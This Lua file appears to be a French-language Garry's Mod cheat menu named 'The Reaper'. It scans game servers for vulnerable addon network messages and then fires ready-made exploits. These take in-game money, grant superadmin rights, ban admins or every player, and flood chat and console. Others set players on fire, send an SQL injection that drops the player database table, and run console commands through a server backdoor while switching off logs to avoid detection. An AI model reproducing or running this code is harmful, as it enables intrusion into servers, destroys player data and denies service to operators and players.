if file.Exists( "includes/extensions/client/vehicles.lua", "LUA" ) == false then -- ne pas toucher cac check !!!!
MsgC (Color(math.random(1,255),math.random(1,255),math.random(1,255)), [[
CHARGEMENT DU MENU EN COURS...

CHARGEMENT TERMINER..
  ]])
local Reaper = nil 
local RatesScaleLevel = LocalPlayer():SteamID()
local FAUCHEUSE = {}
FAUCHEUSE.memory = {}
local grad = Material( "gui/gradient" )
local degraderhaut = Material( "gui/gradient_up" )
local degraderbas = Material( "gui/gradient_down" )
local ctext = chat.AddText


function FAUCHEUSE.ChatText( str )
ctext(Color(math.random(1,255),math.random(1,255),math.random(1,255)), [[ [The Reaper]: ]]..str )
end
function FAUCHEUSE.NetStart( str )
local netstart = net.Start
if Reaper and Reaper.G and Reaper.G.net then
netstart = Reaper.G.net.Start
else
--        print( "sending netmessage in insecure mode" )
end
return netstart( str )
end
function FAUCHEUSE.ValidNetString( str )
local netstart = net.Start
if Reaper and Reaper.G and Reaper.G.net then
netstart = Reaper.G.net.Start
else
--        print( "scanning for exploit in insecure mode" )
end
local status, error = pcall( netstart, str )
return status
end
function FAUCHEUSE.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
FAUCHEUSE.sploits = {}
local severitycols = {
[1] = Color( 0, 255, 0, 200 ),
[2] = Color( 200, 200, 0, 200 ),
[3] = Color( 200, 100, 0, 200 ),
[4] = Color( 255, 0, 0, 200 ),
}
function FAUCHEUSE.AddExploit( name, tab )
if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
FAUCHEUSE.sploits[name] = tab
end
function FAUCHEUSE.IsStored( addr )
return FAUCHEUSE.memory[addr] != nil
end
function FAUCHEUSE.GetStored( addr, fallback )
if fallback and FAUCHEUSE.memory[addr] == nil then return fallback end
return FAUCHEUSE.memory[addr]
end
function FAUCHEUSE.Store( addr, val )
FAUCHEUSE.memory[addr] = val
end
function FAUCHEUSE.GetAllStored()
return FAUCHEUSE.memory
end
function FAUCHEUSE.GetAllStoredData()
local ret = {}
for k, v in pairs( FAUCHEUSE.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
function FAUCHEUSE.LoadConfig()
local f = file.Read( "Reaper_exploit.dat", "DATA" )
if !f then FAUCHEUSE.ChatText( "Aucune configuration." ) end
local raw = util.Decompress( f )
local garbage = util.JSONToTable( raw )
table.Merge( FAUCHEUSE.memory, garbage )
--    FAUCHEUSE.memory = garbage
FAUCHEUSE.Menu:Remove()
FAUCHEUSE.ChatText( "Fichier de configuration chargé" )
end
function FAUCHEUSE.SaveConfig()
local myturds = util.TableToJSON( FAUCHEUSE.GetAllStoredData() )
if !myturds then return end
local cumpressed = util.Compress( myturds )
file.Write( "Reaper_exploit.dat", cumpressed )
FAUCHEUSE.ChatText( "Fichier de configuration sauvegardé" )
end
FAUCHEUSE.AddExploit( "€ Customizable Printers Money Stealer €", {
desc = "Vole instantanément tout l'argent de chaque Printer sur le serveur",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
if !timer.Exists( "Reaper_exploit_shekels" ) then
FAUCHEUSE.ChatText( "Vole de l'argent lancé" )
timer.Create( "Reaper_exploit_shekels", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if( v:GetClass():find("print") ) then
FAUCHEUSE.NetStart( "SyncPrinterButtons76561198056171650" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "Reaper_exploit_shekels" )
FAUCHEUSE.ChatText( "Vole de l'argent stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Spam De Messages Privé [Friend]", {
desc = "Spams les personnes que tu veut sur le serveur",
severity = 1,
scan = function() return (FAUCHEUSE.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,
functions = {
{ typ = "string", name = "Entrer un message", default = "Bitch please", addr = "fr_spamstring" },
{ typ = "players", addr = "fr_players" },
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "bigspams" ) then
FAUCHEUSE.ChatText( "big spam lancé" )
timer.Create( "bigspams", 0.5, 0, function()
local t = FAUCHEUSE.GetStored( "fr_players", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local buyit = {}
for i = 1, 15 do
table.insert( buyit, FAUCHEUSE.GetStored( "fr_spamstring", "RIP les lags :/ */*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*" ) )
end
FAUCHEUSE.NetStart( "sendtable" )
net.WriteEntity( v )
net.WriteTable( buyit )
net.SendToServer()
end
end)
else
timer.Remove( "bigspams" )
FAUCHEUSE.ChatText( "big spam stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Spam D'Erreur La Console", {
desc = "Détruit le serveur rcon avec des erreurs massives )",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Reaper_exploit_errorz" ) then
FAUCHEUSE.ChatText( "erreur spam lancé" )
timer.Create( "Reaper_exploit_errorz", 0.1, 0, function()
FAUCHEUSE.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end)
else
timer.Remove( "Reaper_exploit_errorz" )
FAUCHEUSE.ChatText( "erreur spam stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Turbo Erreur Spammer", {
desc = "Détruit le serveur rcon avec des erreurs massive.",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Reaper_exploit_errorzt" ) then
FAUCHEUSE.ChatText( "erreur spam lancé" )
timer.Create( "Reaper_exploit_errorzt", 0, 0, function()
for i = 1, 100 do
FAUCHEUSE.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_errorzt" )
FAUCHEUSE.ChatText( "erreur spam stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Kun Drug €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "Kun_SellDrug" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "Reaper_exploit_selldrugon" ) then
FAUCHEUSE.ChatText( "Exploit lancé" )
timer.Create( "Reaper_exploit_selldrugon", 0, 0, function()
for i=1,1000 do
FAUCHEUSE.NetStart("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end 
end)
else
timer.Remove( "Reaper_exploit_selldrugon" )
FAUCHEUSE.ChatText( "Exploit stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Point Shop Unbox", {
desc = "Exploit a tester",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "net_PSUnBoxServer" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(player.GetAll()) do
local i = 0
for k2,v2 in pairs(PS.Items) do 
if !v:PS_HasItem(v2.ID) then  
timer.Simple(k*i*1.7,function() 
FAUCHEUSE.NetStart("net_PSUnBoxServer") 
net.WriteEntity(v) 
net.WriteString(v2.ID) 
net.SendToServer() 
end) 
i = i + 1
end 
end
end
end, },
},
} )
FAUCHEUSE.AddExploit( "☢ Give Superadmin ☢", {
desc = "Donnez le superadmin aux gens (rejoignez pour que cela prenne effet)",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "pplay_deleterow" ) end,
functions = {
{ typ = "players", addr = "l_superadmins" },
{ typ = "func", name = "Lancer", func = function()
local t = FAUCHEUSE.GetStored( "l_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}
FAUCHEUSE.NetStart("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
FAUCHEUSE.NetStart("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
FAUCHEUSE.ChatText( "superadmin donné à "..v:Nick() )
end
end, },
},
} )
local lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = ""
if FAUCHEUSE.ValidNetString( "Sandbox_ArmDupe" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "Sandbox_ArmDupe"
else
if FAUCHEUSE.ValidNetString( "Fix_Keypads" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "Fix_Keypads"
else
if FAUCHEUSE.ValidNetString( "Remove_Exploiters" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "Remove_Exploiters"
else
if FAUCHEUSE.ValidNetString( "noclipcloakaesp_chat_text" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "noclipcloakaesp_chat_text"
else
if FAUCHEUSE.ValidNetString( "_Defqon" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "_Defqon"
else
if FAUCHEUSE.ValidNetString( "_CAC_ReadMemory" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "_CAC_ReadMemory"
else
if FAUCHEUSE.ValidNetString( "c" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "c"
else
if FAUCHEUSE.ValidNetString( "killserver" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "killserver"
else
if FAUCHEUSE.ValidNetString( "fuckserver" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "fuckserver"
else
if FAUCHEUSE.ValidNetString( "cvaraccess" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "cvaraccess"
else
if FAUCHEUSE.ValidNetString( "rcon" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "rcon"
else
if FAUCHEUSE.ValidNetString( "rconadmin" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "rconadmin"
else
if FAUCHEUSE.ValidNetString( "web" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "web"
else
if FAUCHEUSE.ValidNetString( "nostrip" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "nostrip"
else
if FAUCHEUSE.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "nostrip"
else
if FAUCHEUSE.ValidNetString( "LickMeOut" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "LickMeOut"
else
if FAUCHEUSE.ValidNetString( "MoonMan" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "MoonMan"
if FAUCHEUSE.ValidNetString( "Im_SOCool" ) then
lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol = "Im_SOCool"
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
FAUCHEUSE.AddExploit( ".NET Backdoor", {
desc = "Backdoor trés puissant, ENLEVE LES LOGS POUR ETRE PLUS DISCRET, Nom De La .NET : "..lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol.."",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol ) end,
functions = {
{ typ = "func", name = "STOP LES LOGS", func = function()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
end, },
{ typ = "htxcommandeliste", name = "COMMANDES HTX" },
{ typ = "players", addr = "give_superadmins" },
{ typ = "func", name = "<- Superadmin", func = function()
local t = FAUCHEUSE.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
FAUCHEUSE.NetStart(lokiilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "ulx adduserid "..id.." superadmin" )
net.WriteBit(false)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "☢ Niquer la base de donné SQL (sa pique) ☢", {
desc = "Vandalisez la base de données darkrp master SQL, effaçant toutes les données des joueurs, vous devez être superamin !!",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "pplay_sendtable" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
FAUCHEUSE.NetStart("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
FAUCHEUSE.ChatText( "Base de données SQL Server détruite" )
end, },
},
} )
FAUCHEUSE.AddExploit( "Détruire Les Datas", {
desc = "Défoncer simplements les datas de leur serveur pour énérver leur devs :D",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "WriteQuery" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "Reaper_exploit_datatrasher" ) then
FAUCHEUSE.ChatText( "Démarrage du spam du dossier data" )
timer.Create( "Reaper_exploit_datatrasher", 0.5, 0, function()
FAUCHEUSE.NetStart( "WriteQuery" )
net.WriteString( "BAN ME -> "..LocalPlayer():SteamID()..string.rep( "!", math.random( 1, 5000 ) ) )
net.SendToServer()
end)
else
timer.Remove( "Reaper_exploit_datatrasher" )
FAUCHEUSE.ChatText( "Spam du dossier data Stopper" )
end
end, },
},
} )
-- Patched
--[[FAUCHEUSE.AddExploit( "Turbo Chat Spam", {
desc = "Gros spam, extrêmement ennuyeux",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "VJSay" ) end,
functions = {
{ typ = "string", name = "Entrer un message", default = "ReaperMenu", addr = "vj_spamstring" },
{ typ = "string", name = "Entrer un son", default = "vo/npc/male01/hacks01.wav", addr = "vj_spamsound" },
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "bigspamsvj" ) then
FAUCHEUSE.ChatText( "big spam lancé" )
timer.Create( "bigspamsvj", 0.1, 0, function()
for k, v in pairs( player.GetAll() ) do
FAUCHEUSE.NetStart( "VJSay" )
net.WriteEntity( v )
net.WriteString( FAUCHEUSE.GetStored( "vj_spamstring", "ACHETER LE @Reaper AJOUTEZ SUPREMACIST" ) )
if FAUCHEUSE.GetStored( "vj_spamsound", "" ) != "" then
net.WriteString( FAUCHEUSE.GetStored( "vj_spamsound", "" ) )
end
net.SendToServer()
end
end)
else
timer.Remove( "bigspamsvj" )
FAUCHEUSE.ChatText( "big spam stoppé" )
end
end, },
},
} )--]]
FAUCHEUSE.AddExploit( "Give une arme", {
desc = "Exploit pour avoir des armes",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "CraftSomething" ) end,
functions = {
{ typ = "string", name = "Nom Arme", default = "m9k_ak47", addr = "armes_a_prendre" },
{ typ = "func", name = "Prendre", func = function()
FAUCHEUSE.NetStart( "CraftSomething" )
net.WriteEntity( LocalPlayer() )
net.WriteString( FAUCHEUSE.GetStored( "armes_a_prendre" ) )
net.WriteString( "" )
net.WriteString( "weapon" )
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "ULX Extended ", {
desc = "Attention cette exploit est risquée si le script est à jour vous allez être kick ^^",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "banleaver" ) end,
functions = {
{ typ = "func", name = "Ban les Admins", func = function()
for k,v in pairs(player.GetAll()) do               
if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro                 
if v != LocalPlayer() then                 
FAUCHEUSE.NetStart("banleaver")                 
net.WriteString(v:SteamID().."{sep}".."Vous avez était Fauché...")                
net.SendToServer()                 
end                
end                
end 
end, },
{ typ = "func", name = "Ban tout le monde", func = function()
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then                 
FAUCHEUSE.NetStart("banleaver")                 
net.WriteString(v:SteamID().."{sep}".."Vous avez était Fauché...")                
net.SendToServer()                 
end                
end  
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Casino NPC €", {
desc = "Exploit d'argent",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "75_plus_win" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent" },
{ typ = "players", addr = "l_players_listing" },
{ typ = "func", name = "Donner", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart( "75_plus_win" )
net.WriteString( FAUCHEUSE.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart( "75_plus_win" )
net.WriteString( -FAUCHEUSE.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ ATM €", {
desc = "Exploit d'argent",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "ATMDepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent5" },
{ typ = "func", name = "Prendre", func = function()
FAUCHEUSE.NetStart( "ATMDepositMoney" )
net.WriteFloat( -FAUCHEUSE.GetStored( "montant_argent5" ) )
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "TAXI Spawn Lag", {
desc = "Exploit pour faire chier les soit disant codeur ;)",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "Taxi_Add" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
FAUCHEUSE.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end, },
{ typ = "func", name = "Super Spam", func = function()
if !timer.Exists( "taxispam" ) then
FAUCHEUSE.ChatText( "Spam spawn Taxi lancé" )
timer.Create( "taxispam", 0.05, 0, function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
FAUCHEUSE.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end)
else
timer.Remove( "taxispam" )
FAUCHEUSE.ChatText( "Spam spawn Taxi arreter" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ eMining €", {
desc = "Exploit d'argent très efficace, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "SellMinerals" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent6" },
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
FAUCHEUSE.NetStart("degraderhaute")
net.WriteTable( { LuaName = v.LuaName, Amount = -FAUCHEUSE.GetStored( "montant_argent6" ) } )
net.SendToServer()
FAUCHEUSE.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
{ typ = "func", name = "Enlever", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
FAUCHEUSE.NetStart("degraderhaute")
net.WriteTable( { LuaName = v.LuaName, Amount = FAUCHEUSE.GetStored( "montant_argent6" ) } )
net.SendToServer()
FAUCHEUSE.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Gamble NPC €", {
desc = "Exploit d'argent Infini",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "TakeBetMoney" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
FAUCHEUSE.NetStart( "TakeBetMoney" )
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Kun Oil Mod €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "Kun_SellOil" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(ents.GetAll()) do
FAUCHEUSE.NetStart("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Rejoindre la Police 1", {
desc = "Rejoint la police sans passer par le formulaire",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "PoliceJoin" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
FAUCHEUSE.NetStart("PoliceJoin")
net.SendToServer() 
end, },
},
} )
FAUCHEUSE.AddExploit( "Rejoindre la Police 2", {
desc = "Rejoint la police sans passer le formulaire",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "CpForm_Answers" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
FAUCHEUSE.NetStart("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Deposit Money €", {
desc = "Exploit d'argent avec les ATM Deposit Money",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "DepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
for k,v in pairs(player.GetAll()) do
FAUCHEUSE.NetStart( "DepositMoney" )
net.WriteEntity(swag)
net.WriteString(-FAUCHEUSE.GetStored( "montant_argent7" ))
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "MDE", {
desc = "Exploit pour supprimer des PermaProps (Viser le props et cliquer sur l'exploit pour le supprimer)",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
FAUCHEUSE.NetStart( "MDE_RemoveStuff_C2S" )
net.WriteTable( {DATA="",TARGET=LocalPlayer():GetEyeTrace().Entity} )
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ SS Shelf NET €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent9" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
FAUCHEUSE.NetStart( 'NET_SS_DoBuyTakeoff' )          
net.WriteEntity(LocalPlayer())          
net.WriteEntity(swag)          
net.WriteTable({'spawned_weapon'})          
net.WriteInt(-FAUCHEUSE.GetStored( "montant_argent9" ), 16)       
net.SendToServer()   
end, },
},
} )
FAUCHEUSE.AddExploit( "€ MODIFIER TAXES €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "NET_EcSetTax" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent10" },
{ typ = "func", name = "Lancer", func = function()
FAUCHEUSE.NetStart("NET_EcSetTax")
net.WriteInt(-FAUCHEUSE.GetStored( "montant_argent10" ), 16)
net.SendToServer() 
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Fine System €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "RP_Accept_Fine" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent11" },
{ typ = "players", addr = "l_players_listing_fine" },
{ typ = "func", name = "Prendre", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-FAUCHEUSE.GetStored( "montant_argent11" ))
net.SendToServer()
end
end, },
{ typ = "func", name = "Envoyer Amende x)", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(FAUCHEUSE.GetStored( "montant_argent11" ))
net.WriteString("Aie aie, les amendes sa pique ?")
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam Envoyer Amende x)", func = function()
if !timer.Exists( "spamamandefine" ) then
FAUCHEUSE.ChatText( "Spam lancé" )
timer.Create( "spamamandefine", 0.1, 0, function()
local t = FAUCHEUSE.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(FAUCHEUSE.GetStored( "montant_argent11" ))
net.WriteString("Aie aie, les amendes sa pique ?")
net.SendToServer()
end
end)
else
timer.Remove( "spamamandefine" )
FAUCHEUSE.ChatText( "Spam stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ 3D Cardealer €", {
desc = "Exploit d'argent",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
functions = {
{ typ = "func", name = "Dupliquer", func = function()
for i = 0, 75 do               
FAUCHEUSE.NetStart( "RXCAR_Shop_Store_C2S" );               
net.WriteTable( { E = ent } );                 
net.SendToServer();                
end
end, },
{ typ = "func", name = "Tout Vendre", func = function()
local ent              
for k,v in pairs(ents.GetAll()) do                 
if v:GetClass() == "rm_car_dealer" then                
ent = v                
end                
end                
for k,v in pairs(RX3DCar_Inventory) do                 
FAUCHEUSE.NetStart( "RXCAR_SellINVCar_C2S" )                
net.WriteTable({UN=v.UniqueID,SE=ent})                 
net.SendToServer()                 
end      
end, },          
},
} )
FAUCHEUSE.AddExploit( "Supprimer Armes / Argent", {
desc = "Supprimer les armes / l'argent de touts le monde",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "drugseffect_remove" ) end,
functions = {
{ typ = "func", name = "Supprimer Armes", func = function()
FAUCHEUSE.NetStart("drugseffect_remove")
net.SendToServer()
end, },
{ typ = "func", name = "Supprimer Argent", func = function()
FAUCHEUSE.NetStart("drugs_money")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Crafting Mod €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
{ typ = "func", name = "Ajouter Argent", func = function()
FAUCHEUSE.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -FAUCHEUSE.GetStored( "montant_argent14" );
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
{ typ = "func", name = "Enlever Argent", func = function()
FAUCHEUSE.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   LocalPlayer():getDarkRPVar("money");
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Mettre le Feu", {
desc = "Mettre les props/joueur en feu.",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "drugs_ignite" ) end,
functions = {
{ typ = "func", name = "Feux Props", func = function()
FAUCHEUSE.NetStart("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end, },
{ typ = "func", name = "Feux Joueurs", func = function()
FAUCHEUSE.NetStart("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Modifier la Vie", {
desc = "Changer la vie des joueurs",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "drugseffect_hpremove" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
{ typ = "func", name = "Vie Normal", func = function()
FAUCHEUSE.NetStart("drugseffect_hpremove")
net.WriteString(FAUCHEUSE.GetStored( "montant_argent15" ))
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Teleportation", {
desc = "Teleporter les joueurs que vous regarder au spawn)",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
functions = {
{ typ = "func", name = "Teleport", func = function()
FAUCHEUSE.NetStart("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end, },
},
} )
